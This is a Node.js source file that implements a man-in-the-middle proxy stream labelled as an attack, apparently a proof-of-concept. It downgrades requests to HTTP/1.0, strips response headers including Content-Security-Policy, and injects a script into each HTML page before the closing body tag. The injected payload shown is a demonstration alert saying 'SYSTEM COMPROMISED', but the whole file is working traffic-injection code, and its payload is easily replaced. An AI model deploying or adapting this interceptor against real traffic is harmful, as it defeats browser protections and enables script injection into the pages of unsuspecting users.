const { Transform } = require('stream');

class Interceptorv2 extends Transform {
    constructor(options = {}) {
        super();
        this.type = options.type || 'upload';
        this.headersSent = false;
    }

    _transform(chunk, encoding, callback) {
        let rawData = chunk.toString();

        
        // Handling request logic (Browser -> Server)
        
        if (this.type === 'upload') {
            // Only modify the first packet (Headers)
            if (rawData.includes('GET ') || rawData.includes('POST ')) {
                console.log('--- [ATTACK] Modifying Request Headers ---');
                
                // THE FIX: Downgrade to HTTP/1.0
                // HTTP/1.0 does not support Chunked Encoding or Keep-Alive by default.
                // This forces the server to give us a simple raw stream.
                rawData = rawData.replace('HTTP/1.1', 'HTTP/1.0');

                // Remove GZIP (Just to be safe)
                rawData = rawData.replace(/Accept-Encoding:.*\r\n/gi, '');
                
                // Remove Connection: keep-alive (Force close)
                rawData = rawData.replace(/Connection:.*\r\n/gi, '');
            }
        }

        // Handling response logic (Server -> Browser)
        if (this.type === 'download') {
            
            if (!this.headersSent && rawData.includes('HTTP/')) {
                // Note: We check for HTTP/1.0 or 1.1 because server might reply with either
                console.log('--- [ATTACK] Inspecting Response Headers ---');

                // 1. Strip Content-Length (force read-until-close)
                rawData = rawData.replace(/Content-Length:.*\r\n/gi, '');

                // 2. Strip Transfer-Encoding (Prevent chunking issues)
                rawData = rawData.replace(/Transfer-Encoding:.*\r\n/gi, '');

                // 3. Strip CSP (Allow scripts)
                rawData = rawData.replace(/Content-Security-Policy:.*\r\n/gi, '');

                this.headersSent = true;
            }

            // INJECT PAYLOAD
            if (this.headersSent && rawData.includes('</body>')) {
                console.log('--- [ATTACK] Injecting Payload ---');
                const payload = `
                    <script>
                        alert('SYSTEM COMPROMISED: Proxy Injection Successful!');
                        document.body.style.border = "10px solid red";
                        document.body.style.backgroundColor = "yellow";
                    </script>
                    </body>
                `;
                rawData = rawData.replace('</body>', payload);
            }
        }

        this.push(Buffer.from(rawData));
        callback();
    }
}

module.exports = { Interceptorv2 };